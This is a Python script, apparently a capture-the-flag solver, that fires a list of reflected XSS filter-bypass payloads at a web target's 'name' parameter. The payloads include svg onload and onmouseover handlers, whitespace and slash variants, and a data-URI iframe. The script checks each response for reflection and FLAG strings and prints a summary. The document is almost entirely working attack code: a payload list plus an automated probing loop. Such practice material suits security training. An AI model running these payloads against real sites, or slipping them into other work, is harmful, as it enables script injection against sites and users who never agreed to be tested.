    # 5. Different syntax: <svg/onload=alert('XSS')>
    ("Slash without space", "<svg/onload=alert('XSS')>", "slash_syntax"),
    
    # 6. Whitespace variations: <svg onload = alert('XSS')>
    ("Whitespace before =", "<svg onload = alert('XSS')>", "whitespace_eq"),
    ("Multiple spaces", "<svg onload=     alert('XSS')>", "multi_space"),
    
    # 7. Event handler variations: <svg onmouseover=alert('XSS')>
    ("Onmouseover", "<svg onmouseover=alert('XSS')>", "onmouseover"),
    ("Onclick", "<svg onclick=alert('XSS')>", "onclick"),
    ("Onmouseenter", "<svg onmouseenter=alert('XSS')>", "onmouseenter"),
    
    # 8. Data URI: <iframe src="data:text/html,<script>alert('XSS')</script>">
    ("Data URI iframe", '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">', "data_uri"),
]

print("=" * 80)
print("[*] XSS Filter Bypass Testing")
print(f"[*] Target: {base_url}?name=[payload]")
print(f"[*] Testing {len(payloads_to_test)} payload variations")
print("=" * 80)

# Store results for analysis
results = []

for test_name, payload, technique in payloads_to_test:
    print(f"\n[+] Testing: {test_name}")
    print(f"    Payload: {payload}")
    
    try:
        # Send GET request with payload as 'name' parameter
        params = {'name': payload}
        response = requests.get(base_url, params=params, timeout=10)
        
        # Analyze response
        status_code = response.status_code
        response_length = len(response.content)
        response_text = response.text
        
        # Check if payload is reflected
        payload_reflected = payload in response_text
        
        # Check if decoded payload appears
        decoded_payload = urllib.parse.unquote(payload)
        decoded_reflected = decoded_payload in response_text
        
        # Check for exact alert patterns
        alert_single_quotes = "alert('XSS')" in response_text
        alert_double_quotes = 'alert("XSS")' in response_text
        alert_backticks = "alert(`XSS`)" in response_text
        
        # Check for FLAG patterns
        flag_patterns = re.findall(r'FLAG\{[^}]+\}', response_text)
        
        # Determine behavior based on response
        behavior = "UNKNOWN"
        if 'Let the game begin' in response_text or 'new_star.png' in response_text:
            behavior = "FILTERED - Payload blocked by filter"
        elif 'Failed! Try again!' in response_text or 'error_star.png' in response_text:
            behavior = "ERROR - Bypassed filter but validation failed"
        elif flag_patterns:
            behavior = "SUCCESS - Flag found!"
        
        # Store result
        result = {
            'technique': technique,
            'test_name': test_name,
            'payload': payload,
            'status_code': status_code,
            'response_length': response_length,
            'payload_reflected': payload_reflected,
            'decoded_reflected': decoded_reflected,
            'alert_single': alert_single_quotes,
            'alert_double': alert_double_quotes,
            'alert_backticks': alert_backticks,
            'behavior': behavior,
            'flags': flag_patterns,
            'full_response': response_text
        }
        results.append(result)
        
        # Print analysis
        print(f"    Status: {status_code} | Length: {response_length} bytes")
        print(f"    Payload reflected: {payload_reflected}")
        print(f"    Decoded reflected: {decoded_reflected}")
        
        alert_indicators = []
        if alert_single_quotes: alert_indicators.append("alert('XSS')")
        if alert_double_quotes: alert_indicators.append('alert("XSS")')
        if alert_backticks: alert_indicators.append("alert(`XSS`)")
        
        if alert_indicators:
            print(f"    Alert patterns: {', '.join(alert_indicators)}")
        
        print(f"    Behavior: {behavior}")
        
        if flag_patterns:
            print(f"    [!!] FLAGS FOUND: {flag_patterns}")
        
    except requests.exceptions.Timeout:
        print(f"    [ERROR] Request timed out")
        results.append({
            'technique': technique,
            'test_name': test_name,
            'payload': payload,
            'error': 'Timeout'
        })
    except Exception as e:
        print(f"    [ERROR] {str(e)}")
        results.append({
            'technique': technique,
            'test_name': test_name,
            'payload': payload,
            'error': str(e)
        })

# Summary analysis
print("\n" + "=" * 80)
print("[*] SUMMARY ANALYSIS")
print("=" * 80)

# Count results by type
filtered_count = sum(1 for r in results if 'error' not in r and 'FILTERED' in r['behavior'])
error_count = sum(1 for r in results if 'error' not in r and 'ERROR' in r['behavior'])
success_count = sum(1 for r in results if 'error' not in r and 'SUCCESS' in r['behavior'])
payload_reflected_count = sum(1 for r in results if 'error' not in r and r['payload_reflected'])
decoded_reflected_count = sum(1 for r in results if 'error' not in r and r['decoded_reflected'])

print(f"Total payloads tested: {len(results)}")
print(f"Filtered (blocked): {filtered_count}")
print(f"Validation errors (bypassed but failed): {error_count}")
print(f"Success (flag found): {success_count}")
print(f"Raw payload reflected: {payload_reflected_count}")
print(f"Decoded payload reflected: {decoded_reflected_count}")

# Show details of payloads that bypassed filter but failed validation (most interesting for bypass research)
if error_count > 0:
    print(f"\n[*] PAYLOADS THAT BYPASSED FILTER (but failed validation):")
    print("-" * 80)
    for r in results:
        if 'error' not in r and 'ERROR' in r['behavior']:
            print(f"\n[+] {r['test_name']}:")
            print(f"    Raw reflected: {r['payload_reflected']}")
            print(f"    Decoded reflected: {r['decoded_reflected']}")
            print(f"    Alert('XSS'): {r['alert_single']}")
            print(f"    Alert(\"XSS\"): {r['alert_double']}")
            print(f"    Alert(`XSS`): {r['alert_backticks']}")
            print(f"    Payload: {r['payload']}")

# Show any flags found
all_flags = [flag for r in results for flag in r.get('flags', [])]
if all_flags:
    print(f"\n[*] FLAGS FOUND:")
    print("=" * 80)
    for flag in all_flags:
        print(f"    {flag}")
else:
    print(f"\n[*] No flags found in any responses")

print("\n[*] Testing complete")
